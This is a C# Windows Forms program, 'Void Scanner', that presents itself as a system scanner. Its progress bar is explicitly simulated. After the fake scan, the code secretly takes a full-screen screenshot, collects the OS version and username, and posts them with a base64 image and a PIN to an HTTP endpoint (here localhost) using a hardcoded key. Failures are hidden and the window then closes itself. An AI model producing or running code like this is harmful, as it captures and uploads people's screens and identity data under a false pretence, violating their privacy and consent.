using System;
using System.Windows.Forms;
using System.Drawing;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace SimpleScanner
{
    public partial class SimpleScannerForm : Form
    {
        private Button scanButton;
        private Label statusLabel;
        private ProgressBar progressBar;
        private string pinCode;

        public SimpleScannerForm()
        {
            InitializeComponent();
        }

        private void InitializeComponent()
        {
            this.Text = "Void Scanner";
            this.Size = new Size(700, 500);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.Black;
            this.FormBorderStyle = FormBorderStyle.None;

            // Start Button
            scanButton = new Button();
            scanButton.Text = "START";
            scanButton.Font = new Font("Arial", 24, FontStyle.Bold);
            scanButton.BackColor = Color.Red;
            scanButton.ForeColor = Color.White;
            scanButton.Size = new Size(200, 80);
            scanButton.Location = new Point(250, 200);
            scanButton.Click += ScanButton_Click;
            this.Controls.Add(scanButton);

            // Status Label
            statusLabel = new Label();
            statusLabel.Text = "Ready to scan...";
            statusLabel.Font = new Font("Arial", 12);
            statusLabel.ForeColor = Color.White;
            statusLabel.AutoSize = true;
            statusLabel.Location = new Point(300, 300);
            this.Controls.Add(statusLabel);

            // Progress Bar
            progressBar = new ProgressBar();
            progressBar.Size = new Size(400, 30);
            progressBar.Location = new Point(150, 350);
            progressBar.Visible = false;
            this.Controls.Add(progressBar);
        }

        private void ScanButton_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Start butonu basıldı!", "Debug", MessageBoxButtons.OK, MessageBoxIcon.Information);
            
            scanButton.Enabled = false;
            statusLabel.Text = "Scanning...";
            progressBar.Visible = true;
            progressBar.Value = 0;

            // Generate PIN
            pinCode = GenerateRandomPin();
            
            // Start scanning
            Task.Run(() => PerformScan());
        }

        private string GenerateRandomPin()
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            Random random = new Random();
            StringBuilder pin = new StringBuilder();
            for (int i = 0; i < 8; i++)
            {
                pin.Append(chars[random.Next(chars.Length)]);
            }
            return pin.ToString();
        }

        private async void PerformScan()
        {
            try
            {
                // Simulate scanning
                for (int i = 0; i <= 100; i += 10)
                {
                    this.Invoke(new Action(() => {
                        progressBar.Value = i;
                        statusLabel.Text = "Scanning... " + i + "%";
                    }));
                    await Task.Delay(500);
                }

                // Take screenshot
                string screenshotPath = TakeScreenshot();
                
                // Send results
                await SendResults(screenshotPath);

                this.Invoke(new Action(() => {
                    statusLabel.Text = "Scan completed!";
                    progressBar.Value = 100;
                }));

                // Wait 3 seconds then close
                await Task.Delay(3000);
                this.Invoke(new Action(() => {
                    Application.Exit();
                }));
            }
            catch (Exception ex)
            {
                this.Invoke(new Action(() => {
                    statusLabel.Text = "Error: " + ex.Message;
                }));
            }
        }

        private string TakeScreenshot()
        {
            try
            {
                var bounds = Screen.PrimaryScreen.Bounds;
                using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (var graphics = Graphics.FromImage(bitmap))
                    {
                        graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
                    }
                    
                    string screenshotPath = Path.Combine(Path.GetTempPath(), "void_screenshot_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".png");
                    bitmap.Save(screenshotPath, System.Drawing.Imaging.ImageFormat.Png);
                    return screenshotPath;
                }
            }
            catch
            {
                return null;
            }
        }

        private async Task SendResults(string screenshotPath)
        {
            try
            {
                using (var client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Add("X-API-Key", "VOID_SCANNER_API_KEY_2025");
                    
                    string screenshotBase64 = null;
                    if (!string.IsNullOrEmpty(screenshotPath) && File.Exists(screenshotPath))
                    {
                        byte[] screenshotBytes = File.ReadAllBytes(screenshotPath);
                        screenshotBase64 = "data:image/png;base64," + Convert.ToBase64String(screenshotBytes);
                    }
                    
                    var results = "VOID SCANNER - SIMPLE SCAN COMPLETED\n" +
                                 "Scan Date: " + DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "\n" +
                                 "System: " + Environment.OSVersion.VersionString + "\n" +
                                 "User: " + Environment.UserName + "\n" +
                                 "Screenshot: " + (screenshotPath ?? "Not available");
                    
                    var json = "{\"pin\":\"" + pinCode + "\",\"results\":\"" + results.Replace("\"", "\\\"").Replace("\n", "\\n") + "\",\"screenshot\":\"" + screenshotBase64 + "\"}";
                    var content = new StringContent(json, Encoding.UTF8, "application/json");
                    var response = await client.PostAsync("http://localhost:5005/api/scan-results", content);
                }
            }
            catch
            {
                // Silent fail
            }
        }
    }

    public class Program
    {
        [STAThread]
        public static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new SimpleScannerForm());
        }
    }
}
